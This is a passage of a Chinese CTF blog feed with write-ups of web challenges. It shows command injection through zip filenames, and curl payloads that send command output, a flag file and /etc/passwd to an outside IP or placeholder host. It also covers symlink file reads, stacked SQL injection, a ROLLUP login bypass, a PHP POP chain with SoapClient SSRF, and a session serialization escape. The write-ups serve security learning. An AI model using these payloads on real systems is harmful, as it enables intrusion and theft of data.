class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/upload',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'id'</span>] != <span class="string">b'1'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">'POST'</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">'password'</span>]</span><br><span class="line">        name = name+<span class="string">'qweqweqwe'</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">'file'</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">        path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"zip"</span> != filename.split(<span class="string">'.'</span>)[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'zip only allowed'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">';'</span>) != <span class="number">-1</span>:</span><br><span class="line">waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">'r'</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">'is_login'</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'not login'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">'/'</span>) != <span class="number">-1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            image = open(path+unzip_filename, <span class="string">"rb"</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/showflag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = open(os.path.join(<span class="string">'./flag/flag.jpg'</span>), <span class="string">"rb"</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"can't give you"</span></span><br></pre></td></tr></table></figure><p>可以看到两个路由 upload 和 showflag，showflag告诉我们flag位置是./flag/flag.jpg，那么就可以看一下upload路由对应的代码</p><p>逻辑比较简单，就是把文件解压到指定的文件夹，限定了只能上传zip,并且解压后的文件名中不能有/</p><p>这里的cmd做了拼接，存在命令注入</p><p>比如设置文件名为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; curl vps&amp;&amp;.zip</span><br></pre></td></tr></table></figure><p>监听vps可收到请求，由于是没有回显的命令执行，所以我们的目的是将执行结果外带出去，但这里限制了/这个字符，就很难去拿到我们的flag,不过大多数unzip都可以结合软连接去攻击，不过软连接是需要获得路径的，我们首先可以通过pwd或者/proc/self/cwd/去读flag</p><p><strong>pwd读法的payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; curl 139.224.236.99:9003 -d &#96;pwd&#96;&amp;.zip</span><br></pre></td></tr></table></figure><p>拿到路径为/ctf/hgfjakshgfuasguiasguiaaui/myflask</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg shell</span><br><span class="line"></span><br><span class="line">zip -y shell.zip shell</span><br></pre></td></tr></table></figure><p>上传上去，回显看到flag图片，这个代码还比较友好直接把路径下的图片response回来了，不用自己在看md5的ip之类的探测路径了</p><p><strong>/proc/self/cwd读法</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/self/cwd/flag/flag.jpg shell</span><br><span class="line">zip -ry shell.zip shell</span><br></pre></td></tr></table></figure><p><strong>/proc/self/environ读法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;proc&#x2F;self&#x2F;environ shell</span><br><span class="line">zip -y qqq.zip shell</span><br></pre></td></tr></table></figure><p>拿到回显内容为</p><p><a href="https://imgse.com/i/QD8s0K" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/10/QD8s0K.md.png" alt="QD8s0K.md.png"></a></p><p>接下来步骤就一样了</p><p>看到其他师傅做法有用awk 声明个 /这样做的，payload如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(III=`awk <span class="string">'BEGIN&#123;printf \"%c\", 47&#125;'</span>`&amp;&amp;curl xxx.xxx.xxx.xxx:9999 -T `<span class="built_in">echo</span> <span class="variable">$&#123;III&#125;</span>ctf<span class="variable">$&#123;III&#125;</span>hgfjakshgfuasguiasguiaaui<span class="variable">$&#123;III&#125;</span>myflask<span class="variable">$&#123;III&#125;</span>flag<span class="variable">$&#123;III&#125;</span>flag.jpg`).zip</span></span><br></pre></td></tr></table></figure><p>还可以在sesssion[‘name’]处进行命令注入，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp; curl xx -d &quot;@&#x2F;etc&#x2F;passwd&quot; #</span><br><span class="line">&amp; curl xx -T &#x2F;etc&#x2F;passwd #</span><br><span class="line">&amp; curl xx -F file&#x3D;@&#x2F;etc&#x2F;passwd #</span><br></pre></td></tr></table></figure><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p>进来也是一个登陆界面</p><p>admin admin 正常返回</p><p>admin’ admin 500报错</p><p>存在注入问题</p><p>有些时候瞎猜想也挺浪费时间的….</p><p>开始的时候试了 11’ or 发现正常返回了，有点迷惑，就开始了一些不切实际的猜想..最后拿到代码发现这个过滤挺神奇的，存在sql注入关键词的话，直接把用户名变成test…</p><p>但是出题人还是给了挺明确的hint的，PDO,一般PDO可能会存在堆叠注入的问题</p><p>这道题也是存在堆叠注入的测试一下payload，这里选的select sleep(3)测试</p><p><a href="https://imgse.com/i/QDrHsS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/10/QDrHsS.md.png" alt="QDrHsS.md.png"></a></p><p>成功延时3s，接下来常规注入就可以，最后发现flag表flag字段注入出来是</p><p>个AmOL#T.zip，实际需要访问AmOL%23T.zip拿到源码，源码的漏洞还是比较简单的</p><p>userindex.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($img_file)) &#123;</span><br><span class="line">     $img_file = <span class="string">'/../favicon.ico'</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> $img_dir = dirname(<span class="keyword">__FILE__</span>) . $img_file;</span><br><span class="line"> $img_base64 = imgToBase64($img_dir);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span> . $img_base64 . <span class="string">'"&gt;'</span>;</span><br></pre></td></tr></table></figure><p>这段代码会把文件以base64的形式输出出来，寻找触发点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $listData = $_REQUEST;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadView(<span class="string">'userIndex'</span>,$listData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用loadview将userindex包含进来，参数可以由$_REQUEST控制，这样就很清楚了，控制下img_file参数，直接拿到flag.</p><h3 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h3><p>进来又是一个登陆界面…</p><p>两个方法可以登陆进去</p><p>首先是万能密码的做法</p><p>这道题的验证机制和普通的验证的机制不太相同</p><p>传统的语句是把post过来的密码用户拼接到一条语句中进行query，造成注入。</p><p>第二种验证机制是把密码和用户分开来，先通过执行第一个sql语句也就是查询用户名的sql语句，把对应的密码查出来，再和post的密码进行比较判断，如果相同，就判断成功</p><p>这个题也就是用的第二种验证机制</p><p>在我们输入普通的万能密码 ‘ or ‘1’#的时候返回的是Wrong password</p><p>在输入正常用户名密码的时候返回的是Wrong username or password，这样就正好符合了上面的这个逻辑，在密码单独认证的步骤肯定是返回密码错误的，这里可以用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span><span class="string">' group by passwd with rollup having passwd is NULL --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">密码为空进行绕过</span></span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/QrSnL6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/10/QrSnL6.md.png" alt="QrSnL6.md.png"></a></p><p>本来是想着不传passwd字段的，这样和NULL才能正常匹配，不过这道题用的是弱类型比较，所以passwd传不传都是可以的</p><p>这里通过注入也是可以进去的</p><p>先注入用户名，看一下下面的图就可以懂这个注入的逻辑了</p><p><a href="https://imgse.com/i/Qsubsf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/11/Qsubsf.md.png" alt="Qsubsf.md.png"></a></p><p>当字母错误返回用户名或密码错误，当字符正确返回密码错误</p><p>注入完用户名之后，开始注入密码</p><p><a href="https://imgse.com/i/QsMQ9s" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/11/QsMQ9s.md.png" alt="QsMQ9s.md.png"></a></p><p>写下脚本跑下就ok了</p><p>进入后可以File_read配和伪协议读源码</p><p>读index.php</p><p>post: filename=php://filter/read=convert.base64-encode/resource=index.php</p><p>依次可以读取到encode.php,index.php,interface.php,se.php</p><p>通过encode.php伪造admin身份，去尝试getflag,给出的回显是只能通过127.0.0.1去打，也就是要ssrf,这时不难想到利用Soap+ssrf结合se.php拿flag</p><p>se.php代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">&#123;</span><br><span class="line">$s1 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">$s1();</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($ke)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mod2[$ke];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line"><span class="keyword">public</span> $mod3;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="keyword">$this</span>-&gt;mod3.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $name;</span><br><span class="line"><span class="keyword">public</span> $flag;</span><br><span class="line"><span class="keyword">public</span> $b;</span><br><span class="line">  </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">session_start(); </span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION),<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line"><span class="keyword">echo</span> call_user_func(<span class="keyword">$this</span>-&gt;b,$a);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;&#123;<span class="keyword">$this</span>-&gt;str2&#125;();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = $_POST[<span class="string">'aa'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>pop链的构造挺简单的，就不详细说了，最终去调用Soapclient类getflag方法，并且访问的是interface.php，而不是index.php?method=get_flag,因为SoapServer是在interface.php声明的</p><p>interface.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'Service.php'</span>);</span><br><span class="line">    $ser = <span class="keyword">new</span> SoapServer(<span class="string">'Service.wsdl'</span>,<span class="keyword">array</span>(<span class="string">'soap_version'</span>=&gt;SOAP_1_2));</span><br><span class="line">    $ser-&gt;setClass(<span class="string">'Service'</span>);</span><br><span class="line">    $ser-&gt;handle();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先把session数据传上去</p><p><a href="https://imgse.com/i/QrfOEV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/11/QrfOEV.md.png" alt="QrfOEV.md.png"></a></p><p>触发反序列化拿到flag</p><p><a href="https://imgse.com/i/QrhkE6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/11/QrhkE6.md.png" alt="QrhkE6.md.png"></a></p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>该准备期末考试了，寒假见！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;题目蛮不错的，学到了一些有意思的地方&lt;/p&gt;
&lt;h3 id=&quot;Web1&quot;&gt;&lt;a href=&quot;#Web1&quot; class=&quot;headerlink
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2019安洵杯web题解</title>
    <link href="http://yoursite.com/2019/12/02/2019%E5%AE%89%E6%B4%B5%E6%9D%AFweb%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2019/12/02/2019%E5%AE%89%E6%B4%B5%E6%9D%AFweb%E9%A2%98%E8%A7%A3/</id>
    <published>2019-12-02T15:42:38.000Z</published>
    <updated>2019-12-02T15:43:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>周末来打了一下这个比赛，比赛质量蛮好的，差一点就三个一血了，执着于调试Tp6的pop了，后来发现换一个pop就好了(错失了一血)，反思下了自己，感觉有时候做题有点不冷静，也使我错失了很多东西。</p><h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h3><p>第一个参数解两次base64加一次md5,传index进去拿到源码，</p><p>(正则有点小问题，导致了非预期)\ bypass下命令执行 c\at flag 拿到flag</p><h3 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的可以看到用了filter函数去处理了序列化数据，并且替换为空，这样就造成了反序列化字符逃逸，通过extract变量覆盖，配合字符逃逸把原本的img字段吞掉就可以的</p><p>构造payload： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]&#x3D;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&amp;_SESSION[img]&#x3D;1&amp;_SESSION[&quot;;s:2:&quot;im&quot;;s:2:&quot;11&quot;;s:3:&quot;img]&#x3D;L2QwZzNfZmxsbGxsbGFn</span><br></pre></td></tr></table></figure><h3 id="iamthinking"><a href="#iamthinking" class="headerlink" title="iamthinking"></a>iamthinking</h3><p>挺可惜的一道题，一直在调试我原来跟进的payload，错失了一血</p><p>最后换了个pop就打通了(最后拿了三血…,数组bypass一下首字符为O的匹配就ok了</p><h3 id="不是文件上传"><a href="#不是文件上传" class="headerlink" title="不是文件上传"></a>不是文件上传</h3><p>被解码坑死..，源码如下</p><p>主要审计下这个helper类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 